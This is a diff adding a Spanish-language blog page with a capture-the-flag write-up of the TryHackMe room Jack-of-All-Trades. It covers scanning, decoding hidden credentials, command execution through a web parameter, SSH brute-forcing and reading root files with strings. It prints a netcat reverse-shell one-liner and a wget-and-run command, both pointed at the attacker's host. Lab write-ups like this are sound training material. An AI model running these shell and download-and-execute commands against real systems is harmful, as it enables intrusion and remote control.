@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>TryHackMe - Jack-of-All-Trades :: sckull — HackTheBox Writeups, CTF</title>    
+  
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Titulo Jack-of-All-Trades     Room Jack-of-All-Trades   Info Boot-to-root originally designed for Securi-Tay 2020   Puntos 400   Dificultad Media   Maker MuirlandOracle    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.
+# Nmap 7.80 scan initiated Wed Apr 8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/jackofalltrades/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="TryHackMe - Jack-of-All-Trades :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Titulo Jack-of-All-Trades     Room Jack-of-All-Trades   Info Boot-to-root originally designed for Securi-Tay 2020   Puntos 400   Dificultad Media   Maker MuirlandOracle    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.
+# Nmap 7.80 scan initiated Wed Apr 8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10." />
+<meta name="twitter:site" content="https://sckull.github.io/" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/image/tryhackme/jackofalltrades/cover.png">
+
+
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TryHackMe - Jack-of-All-Trades :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Titulo Jack-of-All-Trades     Room Jack-of-All-Trades   Info Boot-to-root originally designed for Securi-Tay 2020   Puntos 400   Dificultad Media   Maker MuirlandOracle    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.
+# Nmap 7.80 scan initiated Wed Apr 8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10." />
+<meta property="og:url" content="https://sckull.github.io/posts/jackofalltrades/" />
+<meta property="og:site_name" content="TryHackMe - Jack-of-All-Trades" />
+<meta property="og:image" content="https://sckull.github.io/image/tryhackme/jackofalltrades/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "https://sckull.github.io/"
+        },
+        "articleSection" : "posts",
+        "name" : "TryHackMe - Jack-of-All-Trades",
+        "headline" : "TryHackMe - Jack-of-All-Trades",
+        "description" : "Titulo Jack-of-All-Trades     Room Jack-of-All-Trades   Info Boot-to-root originally designed for Securi-Tay 2020   Puntos 400   Dificultad Media   Maker MuirlandOracle    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.
+# Nmap 7.80 scan initiated Wed Apr 8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-04-08 00:00:00 &#43;0000 UTC",
+        "dateModified" : "2020-04-08 00:00:00 &#43;0000 UTC",
+        "url" : "https://sckull.github.io/posts/jackofalltrades/",
+        "wordCount" : "639",
+        "keywords" : [ "tryhackme","linux","Blog" ]
+    }
+    </script>
+
+
+<meta property="article:published_time" content="2020-04-08 00:00:00 &#43;0000 UTC" />
+
+
+
+
+<a name="top"></a>
+</head>
+
+<body class="dark-theme">
+  
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+      
+        
+                   
+
+          
+
+          
+
+          
+            <li><a href="/about">About</a></li>
+          
+
+        
+      
+        
+                   
+
+          
+            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+          
+
+          
+
+          
+
+        
+      
+        
+                   
+
+          
+
+          
+            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+          
+
+          
+
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        
+
+          
+
+          
+
+          
+            <li><a href="/about">About</a></li>
+          
+
+      
+    
+      
+        
+
+          
+            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+          
+
+          
+
+          
+
+      
+    
+      
+        
+
+          
+
+          
+            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+          
+
+          
+
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title">TryHackMe - Jack-of-All-Trades</h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          <i class="fas fa-calendar-week"></i>
+            Wednesday, Apr 8, 2020
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+        <span class="post-read-time">— 3 min read</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/jackofalltrades/../../image/tryhackme/jackofalltrades/cover.png" class="post-cover center" />
+      
+      <hr />
+     
+    
+
+    <div class="contenido">
+      <h2>Contenido</h2>
+      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#nmap">NMAP</a></li>
+<li><a href="#http">HTTP</a>
+<ul>
+<li><a href="#gobuster">GOBUSTER</a></li>
+</ul></li>
+<li><a href="#user-jack">USER - JACK</a></li>
+<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+</ul></li>
+</ul>
+</nav>
+    </div>
+
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Titulo</th>
+<th>Jack-of-All-Trades</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Room</td>
+<td>Jack-of-All-Trades</td>
+</tr>
+
+<tr>
+<td>Info</td>
+<td>Boot-to-root originally designed for Securi-Tay 2020</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>400</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Media</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a></td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Apr  8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.10.111.123
+Nmap scan report for 10.10.111.123
+Host is up (0.20s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Jack-of-all-trades!
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
+|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
+|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
+|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Apr  8 17:57:19 2020 -- 1 IP address (1 host up) scanned in 76.06 seconds
+</code></pre>
+
+<p><center>
+<img src="https://bombanoise.com/wp-content/uploads/2018/01/futurama-fry-memes-59d4b644d8ec6.jpg" alt="drawing" width="400"/>
+<em>Algo anda mal aqui.</em>
+</center></p>
+
+<h2 id="http">HTTP</h2>
+
+<p>Al visitar el puerto 80 nos muestra un error nuestro navegador.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 16.59.41.png" alt="image" /></p>
+
+<p>La IP esta activa, solo el puerto en el que esta corriendo Apache es el 22 y no el 80, se puede configurar el puerto en firefox dentro de <code>about:config</code> creando un <a href="https://support.mozilla.org/en-US/questions/1083282"><strong>string de configuracion</strong></a>.</p>
+
+<p><img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.01.24.png" alt="image" /></p>
+
+<p>Ahora si podemos visitar la pagina y nos muestra lo siguiente.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.02.16.png" alt="image" /></p>
+
+<h3 id="gobuster">GOBUSTER</h3>
+
+<p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
+
+<pre><code class="language-bash">root@upset:~/thm/jack-of-All-Trades# gobuster dir -u http://10.10.111.123:22/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q
+/.htpasswd (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.php (Status: 403)
+/.hta.html (Status: 403)
+/assets (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/recovery.php (Status: 200)
+/server-status (Status: 403)
+root@upset:~/thm/jack-of-All-Trades#
+</code></pre>
+
+<p>En el index de la pagina encontramos varias cosas interesantes en el codigo fuente.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.05.38.png" alt="image" /></p>
+
+<p>Vemos un comentario que al decodificarlo en base64 nos muestra un mensaje.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.08.48.png" alt="image" /></p>
+
+<p>Nos dirigimos a <strong>/recovery.php</strong> e intentamos utilizar la contraseña con <code>Johny Grave</code> y combinacion del nombre pero no nos deja ingresar.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.10.49.png" alt="image" /></p>
+
+<p>Vemos en el codigo fuente una string codificada.</p>
+
+<pre><code>GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
+</code></pre>
+
+<p>Utilizamos base32 y hex para decodificar la cadena, lo cual nos devuelve una nueva cadena cifrada, esta vez al parecer es Caesar Cipher.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.15.28.png" alt="image" /></p>
+
+<p><a href="https://www.dcode.fr/caesar-cipher"><strong>dcode.fr tiene una herramienta</strong></a> muy util que nos ayudó a decifrar el mensaje, CAesar Cipher.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.17.09.png" alt="image" /></p>
+
+<p>El link que nos menciona el mensaje nos redirige a una pagina de wikipedia con el nombre de <code>Stegosauria</code>, si recordamos en el index hay una imagen con un nombre parecido. Intentamos con steganografia en la imagen utilizando <code>steghide</code>.</p>
+
+<p><img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.20.51.png" alt="image" /></p>
+
+<p>Obtenemos un archivo que nos indica que vamos por buen camino pero la imagen no es la correcta. Hacemos lo mismo con las otras dos imagenes del index, y obtuvimos un archivo con credenciales en la imagen <strong>header.jpg</strong>.</p>
+
+<p><img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.23.20.png" alt="image" /></p>
+
+<p>Ingresamos al panel de <strong>/recovery.php</strong> y vemos un mensaje.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.24.45.png" alt="image" /></p>
+
+<p>Le pasamos un comando al parametro <code>cmd</code> y logramos ejecutar el comando.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 17.25.21.png" alt="image" /></p>
+
+<p>Ahora que podemos ejecutar comandos, utilizamos esta ventaja para obtener una shell inversa, primero creamos un archivo el que contenga nuestro comando para nuestra shell.</p>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1338 &gt;/tmp/f
+</code></pre>
+
+<p>Creamos un pequeño servidor http con python3 <code>python3 -m http.server 80</code>. Ejecutamos el siguiente comando para obtener nuestra shell.</p>
+
+<pre><code>bash -c  &quot;$(wget -qO- 10.8.1.72/shell.sh)&quot; 
+</code></pre>
+
+<p>Y ponemos a la escucha netcat en nuestra maquina <code>rlwrap nc -lvp 1338</code> y obtenemos nuestra shell.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 18.05.44.png" alt="image" /></p>
+
+<h2 id="user-jack">USER - JACK</h2>
+
+<p>Dentro del directorio /home encontramos una lista de posibles contraseñas que parecen ser del usuario jack.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 18.07.41.png" alt="image" /></p>
+
+<p>Utilizamos hydra con la lista de posibles contraseñas en el servicio SSH utilizando el puerto 80, logramos encontrar la contraseña.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 18.22.57.png" alt="image" /></p>
+
+<p>Utilizamos ssh y obtenemos una shell.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 18.23.53.png" alt="image" /></p>
+
+<p>Vemos una imagen, la pasamos a nuestra maquina con netcat, abrimos la imagen y vemos nuestra flag <strong>user.txt</strong>.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 18.32.33.png" alt="image" /></p>
+
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+
+<p>Enumeramos los binarios que puedan ayudar a obtener una shell con privilegios root, encontramos strings con el cual podemos leer archivos.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 18.38.43.png" alt="image" /></p>
+
+<p>Utilizamos <code>strings</code> para obtener nuestra flag <strong>/root/root.txt</strong>.
+<img src="../../image/tryhackme/jackofalltrades/Screenshot from 2020-04-08 18.46.24.png" alt="image" /></p>
+
+    </div>    
+    <hr />
+    
+    <div>
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/sniper/">
+                <span class="button__text">Hack The Box - Sniper</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    
+  </div>
+  
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span style="font-size: 0.85em;">© 2020 sckull</span>
+        
+      
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+  
+</div>
+
+
+
+
+
+
+</body>
+</html>
